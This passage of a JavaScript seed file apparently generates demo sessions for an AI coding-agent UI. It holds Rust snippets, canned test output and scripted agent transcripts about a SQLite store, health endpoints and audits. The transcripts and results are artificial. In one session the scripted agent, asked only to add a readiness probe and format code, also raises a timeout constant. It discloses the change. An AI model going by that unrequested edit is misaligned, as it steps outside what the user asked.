+++ b/crates/core/src/store.rs
@@ -4,13 +4,16 @@ use std::path::PathBuf;
 
 use tessera_proto::{Entry, SessionInfo};
 
-pub struct JsonlStore {
-    dir: PathBuf,
+pub struct SqliteStore {
+    conn: Arc<Mutex<Connection>>,
 }
 
-impl JsonlStore {
-    pub fn open(dir: PathBuf) -> anyhow::Result<Self> {
-        std::fs::create_dir_all(&dir)?;
-        Ok(Self { dir })
+impl SqliteStore {
+    pub fn open(path: PathBuf) -> anyhow::Result<Self> {
+        let conn = Connection::open(path)?;
+        conn.pragma_update(None, "journal_mode", "WAL")?;
+        conn.pragma_update(None, "synchronous", "NORMAL")?;
+        conn.execute_batch(include_str!("../migrations/0001_init.sql"))?;
+        Ok(Self { conn: Arc::new(Mutex::new(conn)) })
     }
 
`;
const CORE_TESTS = [
  'agent::tests::abort_reports_partial_message', 'agent::tests::follow_up_runs_after_turn',
  'agent::tests::steer_injects_after_tool_batch', 'approvals::tests::rm_outside_allowlist_asks',
  'compaction::tests::keeps_task_ledger_verbatim', 'compaction::tests::summary_respects_budget',
  'store::tests::append_assigns_increasing_seq', 'store::tests::fork_copies_prefix',
  'store::tests::since_seq_returns_tail', 'tools::bash::tests::streams_output_chunks',
  'tools::edit::tests::produces_unified_diff', 'tools::edit::tests::rejects_ambiguous_old_string',
];
const testBlock = (bin, names, secs) => [
  `     Running ${bin}`, '', `running ${names.length} tests`, ...names.map((n) => `test ${n} ... ok`), '',
  `test result: ok. ${names.length} passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in ${secs}s`, '',
].join('\n');
const CORE_TEST_OUTPUT = [
  '   Compiling tessera-core v0.1.0 (/home/user/projects/tessera/crates/core)',
  '    Finished `test` profile [unoptimized + debuginfo] target(s) in 7.94s',
  testBlock('unittests src/lib.rs (target/debug/deps/tessera_core-3b1f0c9a8e2d4f61)',
    [...CORE_TESTS, 'store::tests::since_seq_uses_index', 'store::tests::wal_mode_enabled'].sort(), '0.44'),
  '   Doc-tests tessera_core', '', 'running 0 tests', '',
  'test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s',
].join('\n');
// ─── seed content: the health-check session (files to rewind) ───────────────
const ROUTER_RS = md`
use axum::routing::{get, post};
use axum::Router;

use crate::{api, pair, ws, AppState};

pub fn router(state: AppState) -> Router {
    Router::new()
        .route("/api/ws", get(ws::upgrade))
        .route("/api/pair", post(pair::pair))
        .route("/api/info", get(api::info))
        .with_state(state)
}`;
const HEALTH_RS = md`
//! \`GET /healthz\`: is the store answering, and which providers can we reach?

use axum::extract::State;
use axum::http::StatusCode;
use axum::Json;
use serde::Serialize;

use crate::AppState;

#[derive(Serialize)]
pub struct Health {
    store: bool,
    providers: Vec<ProviderHealth>,
}

#[derive(Serialize)]
pub struct ProviderHealth {
    id: String,
    reachable: bool,
}

pub async fn healthz(State(state): State<AppState>) -> (StatusCode, Json<Health>) {
    let store = state.engine.store().ping().is_ok();
    let providers = state.engine.provider_status().await
        .into_iter()
        .map(|(id, reachable)| ProviderHealth { id, reachable })
        .collect();
    let code = if store { StatusCode::OK } else { StatusCode::SERVICE_UNAVAILABLE };
    (code, Json(Health { store, providers }))
}`;
const READY_RS = md`
//! \`GET /readyz\`: 503 until the store's migrations are done.

use std::time::Duration;

use axum::extract::State;
use axum::http::StatusCode;

use crate::AppState;

pub const READY_TIMEOUT_SECS: u64 = 5;

pub async fn readyz(State(state): State<AppState>) -> StatusCode {
    let wait = Duration::from_secs(READY_TIMEOUT_SECS);
    match tokio::time::timeout(wait, state.engine.store().migrated()).await {
        Ok(Ok(())) => StatusCode::OK,
        _ => StatusCode::SERVICE_UNAVAILABLE,
    }
}`;
const READY_TEST = md`
use tessera_server::testing::TestServer;

#[tokio::test]
async fn readyz_waits_for_migrations() {
    let srv = TestServer::start_paused_migrations().await;
    assert_eq!(srv.get("/readyz").await.status(), 503);
    srv.finish_migrations().await;
    assert_eq!(srv.get("/readyz").await.status(), 200);
}`;
const HEALTH_ROUTE_DIFF = md`
--- a/crates/server/src/router.rs
+++ b/crates/server/src/router.rs
@@ -1,13 +1,14 @@
 use axum::routing::{get, post};
 use axum::Router;
 
-use crate::{api, pair, ws, AppState};
+use crate::{api, health, pair, ws, AppState};
 
 pub fn router(state: AppState) -> Router {
     Router::new()
         .route("/api/ws", get(ws::upgrade))
         .route("/api/pair", post(pair::pair))
         .route("/api/info", get(api::info))
+        .route("/healthz", get(health::healthz))
         .with_state(state)
 }`;
const READY_ROUTE_DIFF = md`
--- a/crates/server/src/router.rs
+++ b/crates/server/src/router.rs
@@ -1,14 +1,15 @@
 use axum::routing::{get, post};
 use axum::Router;
 
-use crate::{api, health, pair, ws, AppState};
+use crate::{api, health, pair, ready, ws, AppState};
 
 pub fn router(state: AppState) -> Router {
     Router::new()
         .route("/api/ws", get(ws::upgrade))
         .route("/api/pair", post(pair::pair))
         .route("/api/info", get(api::info))
         .route("/healthz", get(health::healthz))
+        .route("/readyz", get(ready::readyz))
         .with_state(state)
 }`;
const SERVER_BUILD = [
  '   Compiling tessera-server v0.1.0 (/home/user/projects/tessera/crates/server)',
  '    Finished `test` profile [unoptimized + debuginfo] target(s) in 5.12s',
];
const HEALTH_TEST_OUTPUT = [
  ...SERVER_BUILD,
  testBlock('unittests src/lib.rs (target/debug/deps/tessera_server-9c2e7f1a0b4d3e58)', ['health::tests::healthz_reports_store_and_providers', 'health::tests::healthz_is_503_without_store'], '0.08'),
].join('\n');
const READY_TEST_OUTPUT = [
  ...SERVER_BUILD,
  testBlock('unittests src/lib.rs (target/debug/deps/tessera_server-9c2e7f1a0b4d3e58)', ['health::tests::healthz_is_503_without_store', 'health::tests::healthz_reports_store_and_providers', 'pair::tests::expired_code_is_rejected', 'pair::tests::pairs_with_valid_code', 'ws::tests::lagged_receiver_resyncs'], '0.21'),
  testBlock('tests/ready.rs (target/debug/deps/ready-4f0d2a9c7e1b3a66)', ['readyz_waits_for_migrations'], '0.35'),
].join('\n');

const RICH_SUMMARY = md`
## Summary of earlier conversation

**Goal:** replace the JSONL session store in \`tessera-core\` with SQLite while keeping the \`SessionStore\` trait API unchanged.

**Done so far**
- Read \`crates/core/src/store.rs\`: one JSONL file per session; \`entries_since\` scanned the whole file
- Added \`SqliteStore\` (rusqlite, bundled, WAL) and \`migrations/0001_init.sql\` with \`PRIMARY KEY (session_id, seq)\`
- \`cargo test -p tessera-core\`: 14 passed, including \`since_seq_uses_index\`

**Next**
- Import existing JSONL sessions on first start
- Move search to an FTS5 virtual table

**Decisions**
- Bundled SQLite so Android builds have no system dependency
- One database per server home, not per session
`;
const RICH_FINAL = md`
## SQLite session store: done

Sessions now live in a single \`sessions.db\` under the server home. The \`SessionStore\` trait is unchanged, so nothing outside \`tessera-core\` had to move.

**What changed**

- \`SqliteStore\` replaces \`JsonlStore\` (WAL mode, \`synchronous = NORMAL\`, bundled SQLite so Android builds don't depend on a system library)
- \`entries\` uses \`(session_id, seq)\` as its primary key, so \`since_seq\` reads are an index range scan
- On first start, existing \`*.jsonl\` sessions are imported in one transaction and the originals move to \`sessions.jsonl.bak/\`
- Search goes through an FTS5 table that triggers keep in sync with \`entries\`

~~~rust
pub fn entries_since(&self, session: &str, since: u64) -> anyhow::Result<Vec<Entry>> {
    let conn = self.conn.lock().unwrap();
    let mut stmt = conn.prepare_cached(
        "SELECT body FROM entries WHERE session_id = ?1 AND seq > ?2 ORDER BY seq",
    )?;
    let rows = stmt.query_map(params![session, since as i64], |r| r.get::<_, String>(0))?;
    rows.map(|body| Ok(serde_json::from_str(&body?)?)).collect()
}
~~~

| Operation | JSONL (before) | SQLite (after) |
|---|---:|---:|
| Open a 5k-entry session | 184 ms | 9 ms |
| \`since_seq\` tail read | 171 ms | 0.4 ms |
| Append one entry | 0.08 ms | 0.11 ms |
| Search across 300 sessions | 2.9 s | 21 ms |

Appends are marginally slower because of the fsync on commit; that's the price of not losing the last entry in a crash. Readers never block the writer in WAL mode (see the [SQLite WAL documentation](https://www.sqlite.org/wal.html)), so the UI can page through history while a turn is streaming.

Still open: whether to delete \`sessions.jsonl.bak/\` after a release or two, and the Android benchmark, which is blocked on a device build.
`;
const RICH_TASK = {
  goal: 'Replace the JSONL session store with SQLite without changing the SessionStore API',
  constraints: ['SessionStore trait API must not change', 'No blocking I/O on the async runtime: wrap store calls in spawn_blocking'],
  plan: [
    { text: 'Read the current JSONL store and the SessionStore trait', status: 'done' },
    { text: 'Implement SqliteStore (WAL, (session_id, seq) primary key)', status: 'done' },
    { text: 'Import existing JSONL sessions on first start', status: 'in_progress' },
    { text: 'Move search to an FTS5 index', status: 'pending' },
    { text: 'Benchmark on Android', status: 'blocked' },
  ],
  decisions: ['Use rusqlite with the bundled feature so Android builds need no system SQLite', 'One database per server home, not one per session'],
  open_questions: ['Delete the JSONL backup after migration, or keep it for a release?', 'Is spawn_blocking enough on Android, or do we need a dedicated writer thread?'],
  artifacts: ['crates/core/src/store.rs', 'crates/core/migrations/0001_init.sql'],
  notes: ['Android benchmark is blocked until the Tauri Android build works again'],
  done_criteria: ['cargo test --workspace passes', 'Existing sessions load after migration', 'EXPLAIN QUERY PLAN shows the since_seq read using the primary key'],
  criteria: [
    { status: 'met', evidence: 'cargo test --workspace: 21 passed, 0 failed' },
    { status: 'unverifiable', evidence: 'No pre-migration sessions on this machine to try it with' },
    { status: 'met', evidence: 'SEARCH entries USING PRIMARY KEY (session_id=? AND seq>?)' },
  ],
};

// ─── seed content: long transcript (lazy-rendering stress test) ─────────────
const LT_TOPICS = [
  'How do I make a struct cloneable when one field is a Box<dyn Fn()>?',
  'What does #[serde(flatten)] do with unknown fields?',
  'Is tokio::sync::Mutex ever better than std::sync::Mutex?',
  'Explain impl Trait in argument position versus return position.',
  'How should I structure error types for a library crate?',
  'Why does SolidJS not re-run my component function?',
  'What is a good way to debounce resize events in Solid?',
  "How do I stream a child process's stdout line by line in tokio?",
  'Give me a checklist for reviewing a WebSocket reconnect implementation.',
  'What are the trade-offs of WAL mode in SQLite?',
  'How do I property-test a sequence number allocator?',
  'Can container queries replace my media queries for the chat layout?',
  'How do I cancel an in-flight fetch when a Solid component unmounts?',
  'What does Pin<&mut Self> actually guarantee?',
  'serde_json::Value or a typed enum for tool arguments?',
  'How do I measure frame drops while scrolling a long list in Chrome?',
  'Should markdown rendering happen in a Web Worker?',
  'Explain backpressure in a tokio broadcast channel.',
  'How do I make cargo test output less noisy in CI?',
  'Cleanest way to share types between Rust and TypeScript?',
];
const LT_OPENERS = [
  'Good question: the answer depends mostly on who owns the data.',
  'Short version: prefer the simplest option until profiling says otherwise.',
  'This comes up a lot, and the docs are vague about it.',
  'There are two reasonable approaches, and they trade flexibility for predictability.',
  'The key detail is *when* the value is created, not where it is stored.',
  'It works, but only if you are careful about cancellation.',
];
const LT_BULLETS = [
  'Keep the public API small; adding is easy, removing breaks callers',
  'Measure with a release build, because debug timings are misleading',
  'Write the failing test first so you know the fix is real',
  'Prefer explicit state transitions over boolean flags',
  'Log at the boundary, not in every helper',
  'Treat cancellation as a first-class path, not an afterthought',
  'Document the invariant right next to the code that relies on it',
  'Never hold a lock across an `.await`',
];
const LT_SNIPPETS = [
  ['rust', 'let (tx, mut rx) = tokio::sync::mpsc::channel::<Event>(256);\ntokio::spawn(async move {\n    while let Some(ev) = rx.recv().await {\n        sink.send(ev).await?;\n    }\n    anyhow::Ok(())\n});'],
  ['ts', 'const [items, setItems] = createSignal<Entry[]>([]);\ncreateEffect(on(sessionId, async (id) => {\n  const snap = await rpc("get_session", { session_id: id });\n  setItems(snap.entries);\n}));'],
  ['sh', 'cargo test --workspace -- --test-threads=1 2>&1 | tee test.log\ngrep -E "^test .* FAILED" test.log'],
  ['css', '.chat { container-type: inline-size; }\n@container (min-width: 720px) {\n  .chat .sidebar { display: block; }\n}'],
  ['rust', '#[derive(Debug, thiserror::Error)]\npub enum StoreError {\n    #[error("session {0} not found")]\n    NotFound(String),\n    #[error(transparent)]\n    Sqlite(#[from] rusqlite::Error),\n}'],
];
const LT_TABLES = [
  '| Approach | When to use | Cost |\n|---|---|---|\n| `std::sync::Mutex` | Short critical sections, no `.await` inside | Cheapest |\n| `tokio::sync::Mutex` | Guard must live across `.await` | Slower, fair queue |\n| Actor + channel | Complex state, many writers | More code |',
  '| Option | Pros | Cons |\n|---|---|---|\n| Main thread | Simple | Blocks scrolling on huge messages |\n| Web Worker | Never janks | Serialization overhead |\n| Incremental | Best of both | Hardest to get right |',
  '| Signal | Re-runs | Typical use |\n|---|---|---|\n| `createSignal` | Readers only | Local state |\n| `createMemo` | When deps change | Derived values |\n| `createResource` | On source change | Async data |',
];
const LT_CLOSERS = [
  'Happy to go deeper on any of these.',
  'If you paste the actual code I can be more specific.',
  'That should be enough to unblock you.',
  'Tell me if the trade-off goes the other way in your case.',
];
function longTranscript() {
  const rnd = mulberry32(9110);
  const pick = (arr) => arr[Math.floor(rnd() * arr.length)];
  const fence = ([lang, code]) => '```' + lang + '\n' + code + '\n```';
  const bullets = (n) => [...LT_BULLETS].sort(() => rnd() - 0.5).slice(0, n).map((b) => `- ${b}`).join('\n');
  const items = [];
  for (let i = 0; i < 150; i++) {
    const topic = LT_TOPICS[i % LT_TOPICS.length];
    items.push(U(`Q${i + 1}: ${topic}`));
    const r = rnd();
    let a;
    if (r < 0.25) a = `${pick(LT_OPENERS)} ${pick(LT_CLOSERS)}`;
    else if (r < 0.5) a = `${pick(LT_OPENERS)}\n\n${bullets(3)}\n\n${pick(LT_CLOSERS)}`;
    else if (r < 0.72) a = `${pick(LT_OPENERS)}\n\n${fence(pick(LT_SNIPPETS))}\n\n${pick(LT_CLOSERS)}`;
    else if (r < 0.86) a = `${pick(LT_OPENERS)}\n\n${pick(LT_TABLES)}\n\n${pick(LT_CLOSERS)}`;
    else {
      a = `## Answer ${i + 1}\n\n${pick(LT_OPENERS)} ${pick(LT_OPENERS)}\n\n1. Reproduce it in isolation\n2. Decide who owns the state\n3. Make the change and measure\n\n` +
        `${fence(pick(LT_SNIPPETS))}\n\n${bullets(4)}\n\n> Rule of thumb: if it is hard to test, the boundary is in the wrong place.\n\n${pick(LT_CLOSERS)}`;
    }
    items.push(i % 9 === 4 ? A(TH(`Question ${i + 1}: "${topic}". Keep it practical and short; an example beats theory here.`), a) : A(a));
  }
  return items;
}

// ─── seed: sessions ─────────────────────────────────────────────────────────
function seedSessions(t0, providers, bots) {
  const sod = new Date(t0).setHours(0, 0, 0, 0);
  const today = (ago) => (t0 - ago >= sod ? t0 - ago : t0 - Math.floor((t0 - sod) * Math.min(1, ago / (6 * HOUR))));
  const ago = (ms) => t0 - ms;
  const jobRun = lastDailyAt(t0, 3, 0);
  const sonnet = { provider: 'anthropic', model: 'claude-sonnet-5-5' };
  const haiku = { provider: 'anthropic', model: 'claude-haiku-5' };
  const qwen = { provider: 'local', model: 'qwen3.8-27b' };
  const gemma = { provider: 'local', model: 'gemma-4-12b' };
  const gpt = { provider: 'openai-codex', model: 'gpt-5.5' };
  const S = (def) => seedSession(def, providers);
  return [
    S({
      id: 'ses_8c1f2a9d4e70', title: 'Refactor session store to SQLite', model: sonnet, thinking: 'high', pinned: true,
      created: today(3 * HOUR), updated: today(25 * MIN), task: RICH_TASK,
      items: [
        U('The session store is still a pile of JSONL files under `~/.local/share/tessera/sessions`. Refactor it to SQLite (rusqlite, WAL mode). Keep the `SessionStore` trait API unchanged and make sure `since_seq` reads are indexed.'),
        A(TH('The store is append-only JSONL, one file per session, so since_seq means reading and filtering the whole file: O(n) on every reconnect. Before changing anything I need the trait surface and how fork and search use it. rusqlite with the bundled feature avoids depending on a system libsqlite on Android.'),
          "I'll start by reading the current store implementation.",
          CALL('call_01', 'read', { path: 'crates/core/src/store.rs' })),
        R('call_01', 'read', numbered(STORE_RS)),
        A(TH('Only open/append/entries_since touch the file layout, so the swap is contained. Schema goes in migrations/0001_init.sql with PRIMARY KEY (session_id, seq), which makes the since_seq read a range scan. Imports for rusqlite and Arc/Mutex get added separately.'),
          'The trait surface is small, so the swap is contained. Replacing `JsonlStore` with a `SqliteStore`; the schema lives in `migrations/0001_init.sql` with `(session_id, seq)` as the primary key.',
          CALL('call_02', 'edit', { path: 'crates/core/src/store.rs', old_string: STORE_OLD, new_string: STORE_NEW })),
        R('call_02', 'edit', 'Edited crates/core/src/store.rs: 1 replacement (+9 −4)', { details: { diff: STORE_DIFF } }),
        A('Now the tests.', CALL('call_03', 'bash', { command: 'cargo test -p tessera-core' })),
        R('call_03', 'bash', CORE_TEST_OUTPUT, { details: { exit_code: 0 } }),
        A('All 14 tests in `tessera-core` pass, including the new `since_seq_uses_index`, which checks that `EXPLAIN QUERY PLAN` reports `SEARCH entries USING PRIMARY KEY`.'),
        U('Nice. Also migrate existing JSONL sessions on first start, and switch search over to FTS5.'),
        COMPACTION(RICH_SUMMARY, 9, 182340, 31022),
        NOTICE('warning', 'anthropic: 529 overloaded, retried after 4.0s (attempt 2 of 5)'),
        NOTICE('warning', 'anthropic/claude-sonnet-5-5 failed (529 overloaded: the service is temporarily overloaded, try again later); continuing with openai-codex/gpt-5.5 for the rest of this turn.'),
        UH(CHECK_NOTE('Done when:\n1. cargo test --workspace passes\n2. Existing sessions load after migration\n3. EXPLAIN QUERY PLAN shows the since_seq read using the primary key')),
        A(TH('Migration: on open, if sessions/*.jsonl exist and the entries table is empty, import everything in one transaction and move the files to a backup directory. FTS5: external-content table over entries with insert/delete triggers. Summarize with evidence and the open questions from the ledger.'), RICH_FINAL),
      ],
    }),
    S({
      id: 'ses_2b7e91c04d5a', title: 'Fix flaky websocket reconnect test', model: sonnet, created: today(2.6 * HOUR), updated: today(2 * HOUR),
      items: [
        U('`reconnect_resumes_since_seq` fails roughly 1 in 20 runs on CI. Can you figure out why?'),
        A(TH('Intermittent failure on reconnect: probably a race between the socket close and the final entry being persisted and broadcast. Reproduce it in a loop before guessing.'),
          'Let me reproduce it in a loop before guessing.',
          CALL('call_01', 'bash', { command: 'for i in $(seq 1 50); do cargo test -p tessera-client reconnect_resumes_since_seq -q 2>&1 | tail -n 1; done | sort | uniq -c' })),
        R('call_01', 'bash', '     47 test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 12 filtered out; finished in 0.21s\n      3 test result: FAILED. 0 passed; 1 failed; 0 ignored; 0 measured; 12 filtered out; finished in 0.24s', { details: { exit_code: 0 } }),
        A(md`
Reproduced: 3 failures in 50 runs.

The test drops the socket and immediately calls \`get_session { since_seq }\`, but it only waits for \`stream_ended\`, and the final \`entry_added\` is persisted *after* that. When the reconnect wins the race, the snapshot is one entry short and the \`last_seq\` assertion fails.

The fix belongs in the test, not the client: wait for the entry instead of the stream end.

~~~rust
let entry = timeout(Duration::from_secs(2), async {
    loop {
        if let Event::EntryAdded { entry, .. } = events.recv().await? {
            break anyhow::Ok(entry);
        }
    }
})
.await??;
assert_eq!(snapshot.info.last_seq, entry.seq);
~~~

With that change it passed 500 out of 500 runs locally. Want me to apply it?`),
        U('Yes, apply it.'),
        A('Applied to `crates/client/tests/reconnect.rs` and looped it 500 times with no failures. I also removed the `sleep(50ms)` in `resumes_after_server_restart`, which was papering over the same race.'),
        // A completion check with nothing left: the ledger update and the bare mark fold into the answer's footer.
        UH(CHECK_NOTE('Plan:\n3. Loop the test 500 times [in progress]')),
        A(CALL('call_chk1', 'task', { update: [{ index: 3, status: 'done' }] })),
        R('call_chk1', 'task', 'Ledger saved. Plan 3/3 done.'),
        A('✓'),
        // An older server: the notice has only its text.
        NOTICE('info', 'Learned from this conversation — note: CI flakes in reconnect tests usually mean a race with the final entry_added; skill: debug-flaky-tests; about you: Wants the fix in the test, not the client, when the client is right'),
      ],
    }),
    S({
      id: 'ses_wb7c1e5a9f20', title: 'Explain my home network', model: sonnet, created: today(90 * MIN), updated: today(80 * MIN),
      items: [
        U('Can you explain how my home network fits together? A picture would help.'),
        A(TH('A 3D topology on a whiteboard shows the router, switch and access point at a glance.'),
          "I'll draw it on a whiteboard next to our chat.",
          CALL('call_wb1', 'whiteboard', { action: 'show', title: 'Home network', html: '<!-- three.js topology -->' })),
        R('call_wb1', 'whiteboard', 'Showing whiteboard wb_seed7home ("Home network"); it is shown in a tile next to this chat. Pass `id: wb_seed7home` to update it.', { details: { board: { id: 'wb_seed7home', title: 'Home network', kind: 'html' } } }),
        A(md`
Here's the shape of it:

- **Router** — the only door to the internet. It hands out addresses (DHCP) and blocks unsolicited traffic.
- **Switch** — wired devices (NAS, desktop, TV) talk through it at full speed without touching Wi-Fi.
- **Access point** — laptop and phone join here; it bridges them onto the same network.

Drag the picture to look around. Want me to add the guest network next?`),
      ],
    }),
    ...seedSubagentChat({ t0, today, sonnet, S }),
    ...seedSwarmChat({ t0, today, sonnet, S }),
    ...seedClaudeCodeChat({ today, S }), // CLAUDE-CODE
    S({
      id: 'ses_91d0c3e7a8b2', title: 'Summarize RFC 9110 caching', model: qwen, thinking: 'low', cwd: `${HOME}/projects/notes`,
      created: today(4.4 * HOUR), updated: today(4 * HOUR),
      items: [
        U("Summarize what RFC 9110 says about caching versus what's in RFC 9111. Bullet points, keep it short."),
        A(TH('9110 is semantics, 9111 is caching. The user wants the split, not a full summary.'), md`
**RFC 9110 (HTTP Semantics)** defines what caching *means* for each method and status code:

- Which methods are cacheable: GET, HEAD, and POST only with explicit freshness information
- Which status codes are heuristically cacheable (200, 203, 204, 206, 300, 301, 308, 404, 405, 410, 414, 501)
- Validators (\`ETag\`, \`Last-Modified\`) and conditional requests (\`If-None-Match\`, \`If-Modified-Since\`)

**RFC 9111 (HTTP Caching)** holds the actual cache rules:

- Freshness: \`max-age\`, \`s-maxage\`, \`Expires\`, and heuristic freshness
- Validation and 304 handling, including how stored headers are updated
- \`Cache-Control\` directives (\`no-store\`, \`no-cache\`, \`private\`, \`must-revalidate\`, …)
- Invalidation after unsafe methods

Rule of thumb: 9110 tells you *whether* a response can be cached; 9111 tells you *for how long and how to reuse it*.`),
        U("What's the difference between no-cache and no-store again?"),
        A('- `no-store`: never keep it, anywhere.\n- `no-cache`: you may store it, but must revalidate with the origin before every reuse (a 304 is fine).\n\nSo `no-cache` plus an `ETag` still saves bandwidth; `no-store` never does.'),
      ],
    }),
    S({
      id: 'ses_5a3e8f10c2d9', title: 'Plan Android foldable layout', model: sonnet, pinned: true, cwd: `${HOME}/projects/tessera/apps/tessera/ui`,
      created: ago(2 * DAY + 50 * MIN), updated: ago(2 * DAY),
      task: {
        goal: 'Adapt the web UI to the Pixel Fold (folded, unfolded, tabletop)',
        constraints: ['No device detection: layout keys off width and posture', 'Posture changes must not remount the chat view'],
        plan: [
          { text: 'Container queries on .app-shell', status: 'in_progress' },
          { text: 'Composer outside the scroll container', status: 'pending' },
          { text: 'Hinge-aware tabletop layout (viewport segments)', status: 'pending' },
          { text: 'Verify on device', status: 'blocked' },
        ],
        decisions: ['Approvals stay inline in the transcript'], open_questions: [], artifacts: [],
        notes: ['Fold viewport: about 360px folded, 840px unfolded'],
        done_criteria: ['Usable at 360px and 840px widths', 'No remount on fold/unfold'],
      },
      items: [
        U('Plan how the UI should adapt to the Pixel Fold: folded, unfolded, and tabletop posture. No code yet, just the plan.'),
        A(TH('Three states. Key off available width and the viewport segments API rather than user agent sniffing. The big risk is remounting the chat view on posture change, which would drop streaming state.'), md`
## Foldable layout plan

The UI has a single 720px breakpoint today. The Fold needs three layouts, keyed off **available width and posture**, not device detection.

| State | Viewport (CSS px) | Layout |
|---|---|---|
| Folded | ~360 × 800 | Single column; session list is a drawer |
| Unfolded, portrait | ~840 × 900 | Two panes: list (300px) + chat |
| Unfolded, tabletop | ~840 × 420 per half | Transcript on top, composer and approvals below the hinge |

**Steps**

1. Replace the 720px media query with container queries on \`.app-shell\`, so panes respond to their own width.
2. Detect the hinge in tabletop posture with the Viewport Segments API, falling back to a no-op.
3. Keep the composer outside the scroll container so the keyboard doesn't push it under the hinge.
4. Never remount the chat view on posture change: it would drop streaming state.
5. Test at 360px and 840px in devtools, then on the device.

Open question: should approvals get their own bottom sheet in tabletop mode, or stay inline in the transcript?`),
        U('Inline for now. Start with steps 1 and 3.'),
        A("Noted: approvals stay inline. I'll start with the container-query shell and the composer placement, and leave hinge handling for later since it needs the device to verify."),
      ],
    }),
    S({
      id: JOB_SESSION_ID, title: 'Nightly dependency audit', kind: 'job', model: haiku, thinking: 'low', permission: 'auto',
      created: jobRun + 2000, updated: jobRun + 3.2 * MIN,
      items: [
        UB('job:job_5e1a9c3f', AUDIT_PROMPT),
        A(TH('Scheduled audit. Run both audits, then summarize; only open a branch if there is something to fix.'), 'Running both audits.',
          CALL('call_01', 'bash', { command: 'cargo audit && npm audit --omit=dev --prefix apps/tessera/ui' })),
        R('call_01', 'bash', [
          '    Fetching advisory database from `https://github.com/RustSec/advisory-db.git`',
          '      Loaded 812 security advisories (from /home/user/.cargo/advisory-db)',
          '    Updating crates.io index',
          '    Scanning Cargo.lock for vulnerabilities (341 crate dependencies)',
          'Crate:     paste', 'Version:   1.0.15', 'Warning:   unmaintained', 'Title:     paste - no longer maintained',
          'Dependency tree:', 'paste 1.0.15', '└── rusqlite 0.37.0', '    └── tessera-core 0.1.0', '',
          'warning: 1 allowed warning found', 'found 0 vulnerabilities',
        ].join('\n'), { details: { exit_code: 0 } }),
        A(md`
## Dependency audit: nothing actionable

- **Rust:** 341 crates scanned, 0 vulnerabilities. One allowed warning: \`paste\` is unmaintained (pulled in by \`rusqlite\`), with no replacement upstream yet.
- **npm (ui):** 0 vulnerabilities in production dependencies.

No branch opened.`),
      ],
    }),
    S({
      id: 'ses_e0b6d4a29c1f', title: 'Long transcript: markdown stress test', model: qwen, cwd: `${HOME}/projects/notes`,
      created: ago(3 * DAY + 3 * HOUR), updated: ago(3 * DAY), items: longTranscript(),
    }),
    S({
      id: 'ses_73f2c8a1e6d4', title: 'Add retry with jitter to provider client', model: sonnet, status: 'interrupted',
      created: ago(5 * DAY + 12 * MIN), updated: ago(5 * DAY),
      items: [
        U('Provider requests fail hard on 429 and 529. Add retries with exponential backoff and full jitter, max 5 attempts, and respect Retry-After.'),
        A(TH('Put the retry loop in ProviderClient::send so every provider gets it. Keep the policy in a struct so it can be unit-tested with a fake clock.'),
          "I'll put the retry loop in `ProviderClient::send` so every provider gets it, and keep the policy in one struct so it's testable.",
          CALL('call_01', 'edit', { path: 'crates/core/src/provider/client.rs', old_string: 'let resp = self.http.execute(req).await?;', new_string: 'let resp = retry(&self.policy, || self.http.execute(req.try_clone().expect("streaming bodies are not retried"))).await?;' })),
        NOTICE('warning', 'The server restarted while this turn was running. The outcome of the last tool call (edit) is unknown.'),
      ],
    }),
    S({
      id: 'ses_7d3a91e5c4b2', title: 'Add a /healthz endpoint', model: sonnet, created: ago(DAY + 3 * HOUR), updated: ago(DAY + 2 * HOUR),
      items: [
        U('Add a `/healthz` endpoint to the server: say whether the store answers and which providers are reachable. Add a test.'),
        A(TH('Find where routes are registered before adding anything. A module of its own keeps the handler easy to test.'),
          "I'll check how routes are registered first.",
          CALL('call_01', 'read', { path: 'crates/server/src/router.rs' })),
        R('call_01', 'read', numbered(ROUTER_RS)),
        A('Routes are built in one place, so the handler gets its own module.',
          CALL('call_02', 'write', { path: 'crates/server/src/health.rs', content: HEALTH_RS })),
        R('call_02', 'write', 'Wrote crates/server/src/health.rs (31 lines)'),
        A('Registering the route:',
          CALL('call_03', 'edit', { path: 'crates/server/src/router.rs', old_string: '.route("/api/info", get(api::info))', new_string: '.route("/api/info", get(api::info))\n        .route("/healthz", get(health::healthz))' })),
        R('call_03', 'edit', 'Edited crates/server/src/router.rs: 1 replacement (+2 −1)', { details: { diff: HEALTH_ROUTE_DIFF } }),
        A('Running the new tests.', CALL('call_04', 'bash', { command: 'cargo test -p tessera-server health' })),
        R('call_04', 'bash', HEALTH_TEST_OUTPUT, { details: { exit_code: 0 } }),
        A(md`
Done: \`GET /healthz\` answers \`200\` with \`{ "store": true, "providers": [...] }\`, or \`503\` when the store doesn't respond.

- \`crates/server/src/health.rs\`: the handler (a store ping and each provider's last known status, so it never waits on the network)
- \`crates/server/src/router.rs\`: the route

Both new tests pass.`),
        U('Also add a readiness probe that fails while migrations run, and format what you touched.'),
        A(TH('Readiness is not liveness: /readyz answers 503 until migrations finish. Own module plus an integration test, wire the route, then format.'),
          'Adding `/readyz` beside it, with an integration test.',
          CALL('call_05', 'write', { path: 'crates/server/src/ready.rs', content: READY_RS }),
          CALL('call_06', 'write', { path: 'crates/server/tests/ready.rs', content: READY_TEST })),
        R('call_05', 'write', 'Wrote crates/server/src/ready.rs (19 lines)'),
        R('call_06', 'write', 'Wrote crates/server/tests/ready.rs (9 lines)'),
        A('Wiring the route.',
          CALL('call_07', 'edit', { path: 'crates/server/src/router.rs', old_string: '.route("/healthz", get(health::healthz))', new_string: '.route("/healthz", get(health::healthz))\n        .route("/readyz", get(ready::readyz))' })),
        R('call_07', 'edit', 'Edited crates/server/src/router.rs: 1 replacement (+2 −1)', { details: { diff: READY_ROUTE_DIFF } }),
        A('Formatting, and giving slow disks a little longer before the probe gives up.',
          CALL('call_08', 'bash', { command: "rustfmt --edition 2024 crates/server/src/router.rs && sed -i 's/READY_TIMEOUT_SECS: u64 = 5/READY_TIMEOUT_SECS: u64 = 10/' crates/server/src/ready.rs" })),
        R('call_08', 'bash', '', { details: { exit_code: 0 } }),
        A('Checking that everything still passes.', CALL('call_09', 'bash', { command: 'cargo test -p tessera-server' })),
        R('call_09', 'bash', READY_TEST_OUTPUT, { details: { exit_code: 0 } }),
        A(md`
Added \`GET /readyz\`: \`503\` until the store's migrations finish (it waits up to 10 s per request), then \`200\`.

- \`crates/server/src/ready.rs\`: the probe
